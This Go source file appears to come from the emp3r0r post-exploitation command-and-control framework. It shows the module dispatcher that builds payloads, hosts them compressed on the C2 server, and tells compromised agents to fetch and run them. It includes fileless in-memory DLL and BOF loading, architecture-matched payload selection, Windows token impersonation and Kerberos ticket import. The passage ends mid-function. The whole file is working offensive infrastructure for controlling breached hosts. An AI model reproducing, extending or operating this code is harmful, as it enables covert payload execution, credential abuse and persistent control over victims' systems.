package modules

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// moduleCustom run a custom module
// moduleCustom run a custom module
func moduleCustom(ctx *c2context.C2Context) {
	// We might still need live.ActiveModule for metadata like Name
	// But Options come from ctx.Flags
	if live.ActiveModule == nil {
		logging.Warningf("No module selected")
		return
	}
	val, exists := def.Modules.Load(live.ActiveModule.Name)
	if !exists {
		logging.Errorf("Config of %s does not exist", live.ActiveModule.Name)
		return
	}
	config := val.(*def.ModuleConfig)

	// Only require target for non-local modules
	if ctx.Target == nil && !config.IsLocal {
		logging.Errorf("No active agent")
		return
	}

	// build module on C2
	if config.Build != "" {
		logging.Infof("Building %s...", config.Name)
		out, err := build_module(config, ctx.Flags)
		if err != nil {
			logging.Errorf("Build module %s: %v", config.Name, err)
			return
		}
		logging.Infof("Module output:\n%s", out)
	}

	// if module is a plugin, no need to upload and execute files on target
	if config.IsLocal {
		logging.Infof("%s will run as a plugin on C2, no files will be executed on target", config.Name)
		return
	}

	// where to download the module, can be from C2 or peer agents
	peerIP := getPeerIP(ctx.Flags)

	// agent side configs
	payload_type := config.AgentConfig.Type
	invocation, err := resolveInvocation(config, ctx.Flags)
	if err != nil {
		logging.Errorf("Parsing module invocation: %v", err)
		return
	}

	// interactive modules rely on echo handshake before SSH handoff
	if config.AgentConfig.IsInteractive {
		invocation.Argv = []string{"echo", crypto.SHA256SumRaw([]byte(def.MagicString))}
		invocation.Stdin = ""
		invocation.Coff = nil
	}

	invBytes, err := cbor.Marshal(invocation)
	if err != nil {
		logging.Errorf("Encoding invocation: %v", err)
		return
	}
	invB64 := base64.StdEncoding.EncodeToString(invBytes)

	// if in-memory module
	if config.AgentConfig.InMemory {
		handleInMemoryModule(ctx, *config, payload_type, invocation, peerIP)
		return
	}

	// other modules that need to be saved to disk
	handleCompressedModule(ctx, *config, payload_type, invB64, peerIP)
}

// build_module builds a local module using `build.sh`, passing flags as args to `./build.sh`
func build_module(config *def.ModuleConfig, flags map[string]string) (out []byte, err error) {
	err = os.Chdir(config.Path)
	if err != nil {
		return out, err
	}
	defer func() {
		err = os.Chdir(live.EmpWorkSpace)
		if err != nil {
			logging.Warningf("Failed changing directory to %s: %v", live.EmpWorkSpace, err)
		}
	}()

	// Sort flag names so the generated command is deterministic, and shell-quote
	// every value so paths with spaces/backslashes and empty defaults survive
	// interpolation into the `sh -c` command line.
	keys := make([]string, 0, len(flags))
	for name := range flags {
		keys = append(keys, name)
	}
	sort.Strings(keys)

	invoc_args := ""
	for _, name := range keys {
		invoc_args += " --" + name + " " + shellQuote(flags[name])
	}
	build_cmd := fmt.Sprintf("%s%s", config.Build, invoc_args)

	// build module
	out, err = exec.Command("sh", "-c", build_cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("%s (%v)", out, err)
		return out, err
	}

	return out, err
}

// shellQuote quotes a value for safe interpolation into a POSIX shell command.
// Empty values are quoted as ” so they survive `sh -c` word splitting.
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

func getPeerIP(flags map[string]string) string {
	if val, ok := flags["peer"]; ok {
		return val
	}
	if val, ok := flags["download_addr"]; ok {
		return val
	}
	return ""
}

func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type string, invocation def.ResolvedInvocation, peerIP string) {
	if len(config.AgentConfig.Files) == 0 {
		logging.Errorf("No files found for module %s in %s", config.Name, config.Path)
		return
	}

	// DLL modules may ship per-arch payloads (e.g. COFFLoader.x64.dll and
	// COFFLoader.x86.dll). Pick the file matching the target agent arch.
	payloadFile := config.AgentConfig.Files[0]
	hostedName := strings.ToLower(live.ActiveModule.Name)
	if strings.EqualFold(payload_type, "dll") && ctx.Target != nil {
		arch := normalizeAgentArch(ctx.Target.Arch)
		payloadFile = selectDLLFile(config.AgentConfig.Files, arch)
		hostedName = fmt.Sprintf("%s.%s", strings.ToLower(live.ActiveModule.Name), arch)
	}

	// Multi-file modules: host every companion file (all entries except the
	// selected payload) and tell the agent where to cache them in memfs.
	// Gated by the module's own config.json (module_files_memfs). DLL modules
	// are excluded — their extra files are per-arch alternatives, not
	// companions.
	if config.ModuleFilesMemFS && !strings.EqualFold(payload_type, "dll") {
		for _, file := range config.AgentConfig.Files {
			if file == payloadFile {
				continue
			}
			companion, err := hostModuleFile(live.ActiveModule.Name, file, filepath.Join(config.Path, file))
			if err != nil {
				logging.Errorf("Hosting companion file %s: %v", file, err)
				return
			}
			invocation.ModuleFiles = append(invocation.ModuleFiles, companion)
		}
	}

	invBytes, err := cbor.Marshal(invocation)
	if err != nil {
		logging.Errorf("Encoding invocation: %v", err)
		return
	}
	invB64 := base64.StdEncoding.EncodeToString(invBytes)

	hosted_file := filepath.Join(live.WWWRoot, hostedName+".xz")
	logging.Infof("Compressing %s with gzip...", hostedName)

	path := filepath.Join(config.Path, payloadFile)
	data, err := os.ReadFile(path)
	if err != nil {
		logging.Errorf("Reading %s: %v", path, err)
		return
	}
	compressedBytes, err := util.Compress(data)
	if err != nil {
		logging.Errorf("Compressing %s: %v", path, err)
		return
	}
	logging.Infof("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, live.ActiveModule.Name)
	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
	if err != nil {
		logging.Errorf("Writing %s: %v", hosted_file, err)
		return
	}
	fileToDownload := filepath.Base(hosted_file)
	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --invocation %s",
		def.C2CmdCustomModule, strings.ToLower(live.ActiveModule.Name), payload_type, fileToDownload, crypto.SHA256SumFile(hosted_file), strconv.Quote(invB64))
	if peerIP != "" {
		cmd += fmt.Sprintf(" --peer %s", strconv.Quote(peerIP))
	}
	job_id := uuid.NewString()
	logging.Debugf("Sending command %s to %s", cmd, ctx.Target.Tag)
	err = CmdSender(cmd, job_id, ctx.Target.Tag)
	if err != nil {
		logging.Errorf("Sending command %s to %s: %v", cmd, ctx.Target.Tag, err)
	}
}

// hostModuleFile compresses a companion file, hosts it in WWWRoot under a
// module-unique name, and returns the ResolvedModuleFile the agent needs to
// fetch and cache it in memfs.
func hostModuleFile(moduleName, fileName, path string) (def.ResolvedModuleFile, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return def.ResolvedModuleFile{}, fmt.Errorf("reading %s: %w", path, err)
	}
	compressed, err := util.Compress(data)
	if err != nil {
		return def.ResolvedModuleFile{}, fmt.Errorf("compressing %s: %w", path, err)
	}

	base := filepath.Base(fileName)
	// Unique per module so the agent's memfs cache key (derived from the
	// basename) cannot collide across modules.
	hostedBase := fmt.Sprintf("%s.%s.xz", strings.ToLower(moduleName), base)
	hostedPath := filepath.Join(live.WWWRoot, hostedBase)
	if err := os.WriteFile(hostedPath, compressed, 0o600); err != nil {
		return def.ResolvedModuleFile{}, fmt.Errorf("writing %s: %w", hostedPath, err)
	}
	logging.Infof("Hosted module companion %s as %s (%.4fMB)",
		path, hostedPath, float64(len(compressed))/1024/1024)

	return def.ResolvedModuleFile{
		Name:     hostedBase,
		MemPath:  fmt.Sprintf("mem:///%s/%s", strings.ToLower(moduleName), base),
		Checksum: crypto.SHA256SumFile(hostedPath),
	}, nil
}

func handleCompressedModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type, invocationB64, peerIP string) {
	moduleName := strings.ToLower(live.ActiveModule.Name)
	tarball_path := live.WWWRoot + moduleName + ".tar.gz"
	file_to_download := filepath.Base(tarball_path)
	if !util.IsFileExist(tarball_path) {
		logging.Infof("Compressing %s with tar.gz...", moduleName)
		path := config.Path
		err := util.TarArchive(path, tarball_path)
		if err != nil {
			logging.Errorf("Compressing %s: %v", live.ActiveModule.Name, err)
			return
		}
		logging.Infof("Created %.4fMB archive (%s) for module '%s'",
			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, live.ActiveModule.Name)
	} else {
		logging.Infof("Using cached %s", tarball_path)
	}

	checksum := crypto.SHA256SumFile(tarball_path)
	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --invocation %s --type %s --file_to_download %s",
		def.C2CmdCustomModule,
		moduleName, checksum, strconv.Quote(invocationB64), payload_type, file_to_download)
	if peerIP != "" {
		cmd += fmt.Sprintf(" --peer %s", strconv.Quote(peerIP))
	}
	job_id := uuid.NewString()
	err := CmdSender(cmd, job_id, ctx.Target.Tag)
	if err != nil {
		logging.Errorf("Sending command %s to %s: %v", cmd, ctx.Target.Tag, err)
	}

	if config.AgentConfig.IsInteractive {
		handleInteractiveModule(config, job_id)
	}
}

func handleInteractiveModule(config def.ModuleConfig, job_id string) {
	opt, exists := config.Options["args"]
	if !exists {
		config.Options["args"] = &def.ModOption{
			Name: "args",
			Desc: "run this command with these arguments",
			Val:  "",
			Vals: []string{},
		}
	}
	args := opt.Val
	port := strconv.Itoa(util.RandInt(1024, 65535))
	look_for := crypto.SHA256SumRaw([]byte(def.MagicString))

	for i := 0; i < 10; i++ {
		if res, ok := live.CmdResults.Load(job_id); ok {
			if strings.Contains(res.(string), look_for) {
				break
			}
		}
		util.TakeABlink()
	}
	defer func() {
		live.CmdResults.Delete(job_id)
	}()

	_ = args
	_ = port
	logging.Warningf("Interactive module %s is disabled because SSH/SFTP and port-forwarding were removed", config.Name)
}

// hostDLLModules compresses and hosts every DLL module's payload so that
// dependent BOF modules can fetch the correct arch from the C2 file endpoint
// at runtime. DLL payloads are hosted as <name>.<arch>.xz.
func hostDLLModules() {
	def.Modules.Range(func(_, val any) bool {
		config, ok := val.(*def.ModuleConfig)
		if !ok || !strings.EqualFold(config.AgentConfig.Type, "dll") {
			return true
		}
		if len(config.AgentConfig.Files) == 0 || config.Path == "" {
			return true
		}
		for _, file := range config.AgentConfig.Files {
			arch := dllArch(file)
			if arch == "" {
				arch = "amd64"
			}
			hosted := filepath.Join(live.WWWRoot, fmt.Sprintf("%s.%s.xz", strings.ToLower(config.Name), arch))
			if util.IsFileExist(hosted) {
				continue
			}
			path := filepath.Join(config.Path, file)
			data, err := os.ReadFile(path)
			if err != nil {
				logging.Warningf("hostDLLModules: read %s: %v", path, err)
				continue
			}
			compressed, err := util.Compress(data)
			if err != nil {
				logging.Warningf("hostDLLModules: compress %s: %v", path, err)
				continue
			}
			if err := os.WriteFile(hosted, compressed, 0o600); err != nil {
				logging.Warningf("hostDLLModules: write %s: %v", hosted, err)
				continue
			}
			logging.Infof("Hosted DLL module %s as %s", config.Name, hosted)
		}
		return true
	})
}

// dllArch derives the canonical arch ("amd64" or "386") from a DLL file name.
func dllArch(file string) string {
	lower := strings.ToLower(file)
	switch {
	case strings.Contains(lower, "x64"), strings.Contains(lower, "amd64"):
		return "amd64"
	case strings.Contains(lower, "x86"), strings.Contains(lower, "386"):
		return "386"
	}
	return ""
}

// normalizeAgentArch maps agent-reported arch strings to the canonical
// amd64/386 names used by the module system.
func normalizeAgentArch(arch string) string {
	switch strings.ToLower(arch) {
	case "x64", "amd64", "x86_64":
		return "amd64"
	case "x32", "x86", "386", "i386", "i686":
		return "386"
	}
	return strings.ToLower(arch)
}

// selectDLLFile picks the DLL payload matching the given canonical arch,
// falling back to the first file when no match is found.
func selectDLLFile(files []string, arch string) string {
	for _, file := range files {
		if dllArch(file) == arch {
			return file
		}
	}
	return files[0]
}

// Print module meta data
func ModuleDetails(modName string, ctx *c2context.C2Context) {
	info := GetModuleDetails(modName)
	if info == nil {
		return
	}

	// Call UI callback if provided
	if ctx != nil && ctx.OnUIReady != nil {
		ctx.OnUIReady(info)
	}
}

// scan custom modules in ModuleDir,
// and update ModuleHelpers, ModuleDocs
func InitModules() {
	if !util.IsExist(live.WWWRoot) {
		os.MkdirAll(live.WWWRoot, 0o700)
	}

	load_mod := func(mod_search_dir string) {
		// don't bother if module dir not found
		if !util.IsExist(mod_search_dir) {
			return
		}

		// Ensure bof_common is in the workspace modules directory if it exists in search dir
		src_bof_common := filepath.Join(mod_search_dir, "bof_common")
		dst_bof_common := filepath.Join(live.EmpWorkSpace, "modules", "bof_common")
		if util.IsExist(src_bof_common) && src_bof_common != dst_bof_common {
			_ = os.MkdirAll(filepath.Dir(dst_bof_common), 0o700)
			_ = util.Copy(src_bof_common, dst_bof_common)
		}

		logging.Debugf("Scanning %s for modules", mod_search_dir)
		dirs, readdirErr := os.ReadDir(mod_search_dir)
		if readdirErr != nil {
			logging.Errorf("Failed to scan custom modules: %v", readdirErr)
			return
		}
		for _, dir := range dirs {
			if !dir.IsDir() {
				continue
			}
			config_file := fmt.Sprintf("%s/%s/config.json", mod_search_dir, dir.Name())
			if !util.IsExist(config_file) {
				continue
			}
			configs, readConfigErr := readModConfigs(config_file)
			if readConfigErr != nil {
				logging.Warningf("Reading config from %s: %v", dir.Name(), readConfigErr)
				continue
			}

			var copiedPath string
			var hasCopied bool

			for _, config := range configs {
				func() {
					defer func() {
						if r := recover(); r != nil {
							logging.Errorf("Panic while loading module %s: %v. Rolling back registration.", config.Name, r)
							def.Modules.Delete(config.Name)
							deleteModuleRunner(config.Name)
						}
					}()

					// module path, eg. ~/.emp3r0r/modules/foo
					originalPath := fmt.Sprintf("%s/%s", mod_search_dir, dir.Name())
					config.Path = originalPath
					if config.IsLocal || config.Build != "" {
						if hasCopied {
							config.Path = copiedPath
						} else {
							mod_dir := filepath.Join(live.EmpWorkSpace, "modules", dir.Name())
							absConfigPath, _ := filepath.Abs(config.Path)
							absModDir, _ := filepath.Abs(mod_dir)
							if absConfigPath == absModDir {
								logging.Debugf("Module %s is already in workspace, skipping copy", config.Name)
								copiedPath = mod_dir
								hasCopied = true
							} else {
								err := os.MkdirAll(mod_dir, 0o700)
								if err != nil {
									logging.Warningf("Failed to create %s: %v", mod_dir, err)
									return
								}
								err = util.Copy(config.Path, mod_dir)
								if err != nil {
									logging.Warningf("Copying %s to %s: %v", config.Path, mod_dir, err)
									return
								}
								config.Path = mod_dir
								copiedPath = mod_dir
								hasCopied = true
							}
						}
					}

					// add to module helpers
					registerModuleRunner(config.Name, moduleCustom)

					// Check for conflicting module names
					if _, exists := def.Modules.Load(config.Name); exists {
						logging.Warningf("Conflicting module name: module '%s' is already registered/loaded. The new definition will overwrite it.", config.Name)
					}

					// Store FIRST so that updateModuleHelp can Load and patch the Options map.
					// Without this, the Load inside updateModuleHelp always misses and the
					// validated options are silently discarded.
					def.InjectTokenOption(config)
					def.Modules.Store(config.Name, config)
					readConfigErr = updateModuleHelp(config)
					if readConfigErr != nil {
						logging.Warningf("Loading config from %s: %v", config.Name, readConfigErr)
						def.Modules.Delete(config.Name) // rollback — don't expose a broken entry
						deleteModuleRunner(config.Name)
						return
					}
					logging.Debugf("Loaded module %s", strconv.Quote(config.Name))
				}()
			}
		}
	}

	// read from every defined module dir
	for _, mod_search_dir := range live.ModuleDirs {
		load_mod(mod_search_dir)
	}

	// Pre-host DLL modules so BOF module dependencies can download them on
	// demand even if the operator never ran the DLL module directly.
	hostDLLModules()

	count := 0
	def.Modules.Range(func(_, _ any) bool {
		count++
		return true
	})
	logging.Infof("Loaded %d modules", count)
}

// readModCondig read config.json of a module
func readModCondig(file string) (pconfig *def.ModuleConfig, err error) {
	configs, err := readModConfigs(file)
	if err != nil {
		return nil, err
	}
	if len(configs) == 0 {
		return nil, fmt.Errorf("no configurations found in %s", file)
	}
	return configs[0], nil
}

// readModConfigs reads config.json which may define one or more modules.
//
// JSON format (unified)
// ─────────────────────
//
//	{
//	  "name": "hello_linux",
//	  "parameters": [
//	    { "name":"who", "description":"...", "default":"World",
//	      "type":"cstr", "required":false }
//	  ],
//	  "agent_config": { "type":"coff", ... },
//	  "invocation":  { "coff_export":"go" }
//	}
//
// The "type" field in each parameter is the single source of truth for both
// input validation (C2 side) and COFF wire-packing (agent side).
func readModConfigs(file string) (configs []*def.ModuleConfig, err error) {
	// optionJSON is the unified parameter declaration.
	type optionJSON struct {
		Name     string   `json:"name"`
		Desc     string   `json:"description"`
		Val      string   `json:"default"`
		Vals     []string `json:"choices"`
		Type     string   `json:"type"`
		Required bool     `json:"required"`
		Pattern  string   `json:"pattern"`
		Encoding string   `json:"encoding"`
		Secret   bool     `json:"secret"`
		Min      *float64 `json:"min"`
		Max      *float64 `json:"max"`
		ArgvFlag string   `json:"argv_flag"`
	}

	type invocationArgJSON struct {
		Literal string `json:"literal"`
		Flag    string `json:"flag"`
	}

	type invocationJSON struct {
		Argv           []invocationArgJSON `json:"argv"`
		StdinParam     string              `json:"stdin_param"`
		TimeoutSeconds int                 `json:"timeout_seconds"`
		CoffExport     string              `json:"coff_export"`
		DllExport      string              `json:"dll_export"`
		DllEntry       string              `json:"dll_entry"`
		DllFileParam   string              `json:"dll_file_param"`
	}

	type agentConfigJSON struct {
		Exec          string   `json:"exec"`
		Files         []string `json:"files"`
		InMemory      bool     `json:"in_memory"`
		Type          string   `json:"type"`
		IsInteractive bool     `json:"interactive"`
		WorkDir       string   `json:"work_dir"`
		NeedsRoot     bool     `json:"needs_root"`
	}

	type moduleConfigJSON struct {
		Name         string          `json:"name"`
		Build        string          `json:"build"`
		Author       string          `json:"author"`
		Date         string          `json:"date"`
		Comment      string          `json:"comment"`
		IsLocal      bool            `json:"is_local"`
		Platform     string          `json:"platform"`
		Path         string          `json:"path"`
		Fileless     bool            `json:"fileless"`
		AgentConfig  agentConfigJSON `json:"agent_config"`
		Parameters   []optionJSON    `json:"parameters"`
		Invocation   invocationJSON  `json:"invocation"`
		Dependencies []string        `json:"dependencies"`
		// ModuleFilesMemFS uploads and caches all companion files in
		// encrypted memfs so multi-file starlark modules can read them via
		// read_file("mem:///...").
		ModuleFilesMemFS bool `json:"module_files_memfs"`
	}

	jsonData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("read %s: %v", file, err)
	}

	var rawList []moduleConfigJSON
	if err = json.Unmarshal(jsonData, &rawList); err != nil {
		var raw moduleConfigJSON
		if err = json.Unmarshal(jsonData, &raw); err != nil {
			return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
		}
		rawList = []moduleConfigJSON{raw}
	}

	for _, raw := range rawList {
		config := def.ModuleConfig{
			Name:     raw.Name,
			Build:    raw.Build,
			Author:   raw.Author,
			Date:     raw.Date,
			Comment:  raw.Comment,
			IsLocal:  raw.IsLocal,
			Platform: raw.Platform,
			Path:     raw.Path,
			Fileless: raw.Fileless,
			Options:  def.ModOptions{},
			AgentConfig: def.AgentModuleConfig{
				Exec:          raw.AgentConfig.Exec,
				Files:         raw.AgentConfig.Files,
				InMemory:      raw.AgentConfig.InMemory,
				Type:          raw.AgentConfig.Type,
				IsInteractive: raw.AgentConfig.IsInteractive,
				WorkDir:       raw.AgentConfig.WorkDir,
				NeedsRoot:     raw.AgentConfig.NeedsRoot,
			},
			ModuleFilesMemFS: raw.ModuleFilesMemFS,
		}

		config.Invocation.TimeoutSeconds = raw.Invocation.TimeoutSeconds
		config.Invocation.StdinParam = raw.Invocation.StdinParam
		config.Invocation.CoffExport = raw.Invocation.CoffExport
		config.Invocation.DllExport = raw.Invocation.DllExport
		config.Invocation.DllEntry = raw.Invocation.DllEntry
		config.Invocation.DllFileParam = raw.Invocation.DllFileParam
		config.Dependencies = raw.Dependencies

		seenParams := make(map[string]bool)
		for _, p := range raw.Parameters {
			if p.Name == "" {
				continue
			}
			if seenParams[p.Name] {
				logging.Warningf("Module '%s' config warning: duplicate parameter '%s' defined", raw.Name, p.Name)
			}
			seenParams[p.Name] = true

			// Check for conflicts with reserved command-line flags
			if p.Name == "force" || p.Name == "help" {
				logging.Warningf("Module '%s' config warning: parameter '%s' conflicts with reserved command-line flags (Cobra/pflag built-in)", raw.Name, p.Name)
			}

			config.Options[p.Name] = &def.ModOption{
				Name:     p.Name,
				Desc:     p.Desc,
				Val:      p.Val,
				Vals:     p.Vals,
				Type:     p.Type,
				Required: p.Required,
				Pattern:  p.Pattern,
				Encoding: p.Encoding,
				Secret:   p.Secret,
				Min:      p.Min,
				Max:      p.Max,
				ArgvFlag: p.ArgvFlag,
			}
		}

		isCOFF := strings.EqualFold(raw.AgentConfig.Type, "coff")
		isDLL := strings.EqualFold(raw.AgentConfig.Type, "dll")

		// DLL defaults (in-memory DLL loader convention)
		if isDLL {
			if config.Invocation.DllExport == "" {
				config.Invocation.DllExport = "LoadAndRun"
			}
			if config.Invocation.DllEntry == "" {
				config.Invocation.DllEntry = "go"
			}
			if config.Invocation.DllFileParam == "" {
				config.Invocation.DllFileParam = "file"
			}
		}

		// Literal-only argv prefix entries
		for _, a := range raw.Invocation.Argv {
			config.Invocation.Argv = append(config.Invocation.Argv, def.InvocationArg{
				Literal: a.Literal,
				Flag:    a.Flag,
			})
		}

		// Derive argv entries from ordered parameters
		for _, p := range raw.Parameters {
			if p.Name == "" {
				continue
			}
			config.Invocation.Argv = append(config.Invocation.Argv, def.InvocationArg{
				Flag:  p.ArgvFlag,
				Param: p.Name,
			})
		}

		// Derive CoffInvocation from parameters.
		// COFF modules pack their exported entry (usually "go"). DLL loader
		// modules use DllEntry as the BOF entry name instead.
		coffExport := raw.Invocation.CoffExport
		if isDLL {
			coffExport = config.Invocation.DllEntry
		}
		if (isCOFF || isDLL) && coffExport != "" {
			coff := def.CoffInvocation{Export: coffExport}
			for _, p := range raw.Parameters {
				if p.Name == "" {
					continue
				}
				// The BOF file path is a control parameter for DLL modules,
				// not a BOF argument.
				if isDLL && config.Invocation.DllFileParam != "" && p.Name == config.Invocation.DllFileParam {
					continue
				}
				coff.Args = append(coff.Args, def.CoffArgSpec{
					Param:    p.Name,
					Encoding: p.Encoding,
				})
			}
			config.Invocation.Coff = &coff
		}

		// Windows BOF modules automatically depend on the in-memory COFFLoader DLL.
		if isCOFF && strings.EqualFold(raw.Platform, "windows") {
			found := false
			for _, dep := range config.Dependencies {
				if strings.EqualFold(dep, "coffloader") {
					found = true
					break
				}
			}
			if !found {
				config.Dependencies = append(config.Dependencies, "coffloader")
			}
		}

		configs = append(configs, &config)
	}

	return configs, nil
}

func updateModuleHelp(config *def.ModuleConfig) error {
	help_map := make(map[string]*def.ModOption)
	for opt, modOption := range config.Options {
		if modOption.Desc == "" {
			return fmt.Errorf("%s config error: %s incomplete", config.Name, opt)
		}
		help_map[opt] = modOption
		if val, ok := def.Modules.Load(config.Name); ok {
			mod := val.(*def.ModuleConfig)
			mod.Options = help_map
			def.Modules.Store(config.Name, mod)
		}
	}
	return nil
}

// typeToWireToken maps the unified parameter type to a COFFLoader wire token.
// Returns "" for non-COFF types (starlark, string, int, …); the caller should
// only pass COFF-relevant types.
//
// Wire token conventions follow the COFFLoader beacon_generate.py standard:
//
//	z      – UTF-8 C-string (addString)
//	Z      – UTF-16LE wide string (addWString)
//	i      – 32-bit integer (addint)
//	s      – 16-bit short integer (addshort)
//	b      – length-prefixed binary blob (base64 input)
func typeToWireToken(typeName string) string {
	// Canonical single-char tokens are case-sensitive: z is narrow, Z is wide,
	// s is short.
	switch typeName {
	case "z":
		return "z"
	case "Z":
		return "Z"
	case "i":
		return "i"
	case "s":
		return "s"
	case "b":
		return "b"
	}

	switch strings.ToLower(typeName) {
	case "cstr", "string", "str", "lpstr":
		return "z"
	case "wstr", "wstring", "lpwstr", "w":
		return "Z"
	case "int", "dword", "uint32", "uint", "int32", "port", "bool":
		return "i"
	case "short", "word", "int16":
		return "s"
	case "binary", "base64":
		return "b"
	default:
		return ""
	}
}

// coffArgNeedsZero reports whether a rendered COFF argument value must be
// replaced with a zero value: numeric wire types (i/s) reject an empty string
// when packed on the agent side.
func coffArgNeedsZero(typed any, wireTyp string) bool {
	if s, ok := typed.(string); ok && s == "" {
		return wireTyp == "i" || wireTyp == "s"
	}
	return false
}

// coffArgZeroValue returns a valid zero value for a COFF wire token so a
// declared BOF argument is always packed even when the operator left it empty.
func coffArgZeroValue(wireTyp string) any {
	switch wireTyp {
	case "i", "s":
		return float64(0)
	default:
		return ""
	}
}

// resolveInvocation renders an invocation with concrete values from module options.
//
// For COFF modules the WireType on each ResolvedCoffArg is derived from the
// parameter's unified "type" field via typeToWireToken.
func resolveInvocation(config *def.ModuleConfig, flags map[string]string) (def.ResolvedInvocation, error) {
	resolved := def.ResolvedInvocation{TimeoutSeconds: config.Invocation.TimeoutSeconds}

	// ── token (Windows impersonation) ─────────────────────────────────────
	// The "token" option is special: it is not passed as argv but wired
	// directly into ResolvedInvocation.Token for the agent's ExecuteAsToken.
	if tokenSID, ok := flags["token"]; ok {
		resolved.Token = strings.TrimSpace(tokenSID)
	}

	// ── make_token session user + Kerberos ticket (Windows) ────────────────
	// Injected options: --user creates/reuses a netlogon session for the user
	// and --ticket imports a KRB-CRED into the resolved session before the
	// module runs. Only wired when the option was injected (i.e. the module
	// did not declare its own "user"/"ticket" parameter).
	if def.OptionWasInjected(config.Name, "user") {
		if user, ok := flags["user"]; ok {
			resolved.SessionUser = strings.TrimSpace(user)
		}
	}
	if def.OptionWasInjected(config.Name, "ticket") {
		if ticket, ok := flags["ticket"]; ok {
			resolved.Ticket = strings.TrimSpace(ticket)
		}
	}

	// ── dependencies & DLL invocation ─────────────────────────────────────
	resolved.Dependencies = config.Dependencies
	resolved.DllExport = config.Invocation.DllExport
	resolved.DllEntry = config.Invocation.DllEntry

	lookupOpt := func(name string) (*def.ModOption, string, error) {
		if config.Options != nil {
			if opt, ok := config.Options[name]; ok && opt != nil {
				if val, ok := flags[name]; ok {
					return opt, val, nil
				}
				return opt, opt.Val, nil
			}
		}
		return nil, "", fmt.Errorf("option %s not defined", name)
	}

	coerceVal := func(name string) (string, any, error) {
		opt, val, err := lookupOpt(name)
		if err != nil {
			return "", nil, err
		}
		return renderOptionValue(opt, val)
	}

	// Starlark is dynamically typed: its main(*args) receives positional
	// strings and scripts coerce values themselves (int(), bool(), ...). BOF
	// arg packing (type validation, zero-filling, dropping empty args) must
	// not apply here, because dropping an empty optional arg would shift every
	// subsequent positional argument.
	isStarlark := strings.EqualFold(config.AgentConfig.Type, "starlark")
	rawVal := func(name string) (string, error) {
		opt, val, err := lookupOpt(name)
		if err != nil {
			return "", err
		}
		if strings.TrimSpace(val) == "" && opt.Required {
			return "", fmt.Errorf("option %s is required", opt.Name)
		}
		return val, nil
	}

	// ── argv ──────────────────────────────────────────────────────────────
	for _, arg := range config.Invocation.Argv {
		switch {
		case arg.Literal != "":
			resolved.Argv = append(resolved.Argv, arg.Literal)
		case arg.Flag != "" && arg.Param != "":
			var strVal string
			var err error
			if isStarlark {
				strVal, err = rawVal(arg.Param)
			} else {
				strVal, _, err = coerceVal(arg.Param)
			}
			if err != nil {
				return resolved, err
			}
			if !isStarlark && strVal == "" {
				continue
			}
			resolved.Argv = append(resolved.Argv, arg.Flag, strVal)
		case arg.Param != "":
			var strVal string
			var err error
			if isStarlark {
				strVal, err = rawVal(arg.Param)
			} else {
				strVal, _, err = coerceVal(arg.Param)
			}
			if err != nil {
				return resolved, err
			}
			if !isStarlark && strVal == "" {
				continue
			}
			resolved.Argv = append(resolved.Argv, strVal)
		}
	}

	// ── stdin ─────────────────────────────────────────────────────────────
	if config.Invocation.StdinParam != "" {
		stdinVal, _, err := coerceVal(config.Invocation.StdinParam)
		if err != nil {
			return resolved, err
		}
		resolved.Stdin = stdinVal
	}

	// ── COFF packing ─────────────────────────────────────────────────────
	// Wire type comes from the parameter's unified "type" field.
	// Every declared BOF argument is always packed, even when the operator
	// did not supply a value, so the BOF always receives a well-formed arg
	// list and never dereferences a NULL BeaconDataExtract result.
	if config.Invocation.Coff != nil {
		coffInv := &def.ResolvedCoffInvocation{Export: config.Invocation.Coff.Export}
		for _, arg := range config.Invocation.Coff.Args {
			opt, val, lookupErr := lookupOpt(arg.Param)
			if lookupErr != nil {
				return resolved, lookupErr
			}
			wireTyp := typeToWireToken(opt.Type)
			_, typed, renderErr := renderOptionValue(opt, val)
			if renderErr != nil || coffArgNeedsZero(typed, wireTyp) {
				logging.Warningf("BOF arg '%s' (%s) not supplied, packing zero value", arg.Param, wireTyp)
				typed = coffArgZeroValue(wireTyp)
			}
			coffInv.Args = append(coffInv.Args, def.ResolvedCoffArg{
				WireType: wireTyp,
				Value:    typed,
				Encoding: arg.Encoding,
			})
		}
		resolved.Coff = coffInv
	}

	// ── DLL file parameter ────────────────────────────────────────────────
	// The named parameter points at the BOF object file on the agent
	// (mem:/// or disk). It is resolved here but not packed as a BOF arg.
	if config.Invocation.DllFileParam != "" {
		fileVal, _, err := coerceVal(config.Invocation.DllFileParam)
		if err != nil {
			return resolved, err
		}
		resolved.DllFileValue = fileVal
	}

	return resolved, nil
}

// renderOptionValue validates and returns both string and typed representations.
// The unified "type" field covers both non-COFF validation types (string, int,
// uint, bool, port, base64) and COFF wire types (cstr, wstr, dword, short,
// binary).  COFF-specific types fall through to the nearest generic equivalent.
func renderOptionValue(opt *def.ModOption, val string) (string, any, error) {
	val = strings.TrimSpace(val)
	if val == "" {
		if opt.Required {
			return "", nil, fmt.Errorf("option %s is required", opt.Name)
		}
		return "", "", nil
	}

	if len(opt.Vals) > 0 {
		found := false
		for _, v := range opt.Vals {
			if v == val {
				found = true
				break
			}
		}
		if !found {
			return "", nil, fmt.Errorf("option %s must be one of %v", opt.Name, opt.Vals)
		}
	}

	switch strings.ToLower(opt.Type) {
